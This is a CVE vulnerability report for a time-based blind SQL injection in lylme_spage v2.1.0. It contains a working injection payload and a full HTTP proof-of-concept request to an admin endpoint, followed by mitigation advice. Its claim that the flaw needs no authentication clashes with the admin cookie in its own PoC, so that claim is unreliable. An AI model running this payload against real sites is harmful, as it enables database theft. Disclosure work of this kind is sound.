# CVE Submission: SQL Injection Vulnerability in lylme_spage

## 1. Vulnerability Title

**Time-Based SQL Injection in `lylme_spage` via `sort` Parameter**

## 2. Vulnerability Type

**SQL Injection (Time-Based Blind)**

## 3. Product Information

- **Vendor:[lylme](https://github.com/LyLme/lylme_spage)**
- **Product:** [lylme_spage](https://github.com/LyLme/lylme_spage)
- **Affected Version(s):[v2.1.0]**
- **Platform(s):** Web-based (PHP + MySQL)

## 4. Vulnerability Description

A time-based blind SQL injection vulnerability exists in the `lylme_spage` project. The vulnerable point lies in the processing of the `sort` parameter in the following SQL statement:

```php
$sql = "INSERT INTO `lylme_tags` (`tag_id`, `tag_name`, `tag_link`, `tag_target`,`sort`) VALUES (NULL, '" . $name . "', '" . $link . "', '" . $target . "','" . $sort . "');"
```

Due to the direct concatenation of user input without proper sanitization or use of prepared statements, an attacker can inject malicious SQL code via the `sort` parameter.

## 5. Steps to Reproduce

1. Submit a request to the relevant endpoint that triggers the above SQL statement.
2. Inject the following payload into the `sort` parameter:

```
10"'>if(ord(substring(user(),1,1))=108,sleep(5)&exp(999),exp(999))>0);#
```

3. If the first character of the database username is `'l'` (ASCII 108), the server will pause for 5 seconds, confirming the vulnerability.

## 6. Impact

An unauthenticated attacker can:

- Extract database-level information (such as current user, schema, or data)
- Chain blind injection queries to dump database content
- Potentially gain control over the backend system if privileges are high

## 7. Proof of Concept (PoC)

```http
POST /admin/ajax_link.php?submit=add_tag HTTP/1.1
Host: 192.168.153.1:8012
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundary32938179cf3e33feeb308e1c9e0d543a
Content-Length: 562
Origin: http://192.168.153.1:8012
Connection: close
Referer: http://192.168.153.1:8012/admin/tag.php?set=add
Cookie: admin_token=85aeVC2jJJRD%2Fp%2FI7iswn1oGr1H7VfJ9KJGJwk9OapcP7OWbXvEzNTzGiMhJvYYQIkvj1RaKrFbvQ6T%2BsmXF%2F2x8hA; PHPSESSID=hrqk60j6v4afe8b7gi95dphi07
Priority: u=0

------geckoformboundary32938179cf3e33feeb308e1c9e0d543a
Content-Disposition: form-data; name="name"

1
------geckoformboundary32938179cf3e33feeb308e1c9e0d543a
Content-Disposition: form-data; name="link"

1
------geckoformboundary32938179cf3e33feeb308e1c9e0d543a
Content-Disposition: form-data; name="target"

1
------geckoformboundary32938179cf3e33feeb308e1c9e0d543a
Content-Disposition: form-data; name="sort"

10"'>if(ord(substring(user(),1,1))=108,sleep(5)&exp(999),exp(999))>0);#
------geckoformboundary32938179cf3e33feeb308e1c9e0d543a--

```

Monitor the response time of the server. A 5-second delay indicates a successful injection.

## 8. Mitigation / Recommendations

- Use **prepared statements** (e.g., `PDO` or `mysqli` with bound parameters)
- Apply strict input validation and sanitization
- Disable detailed SQL error reporting in production

## 9. Credit

Discovered by **yanbei**
Contact:yanbei_mail@163.com
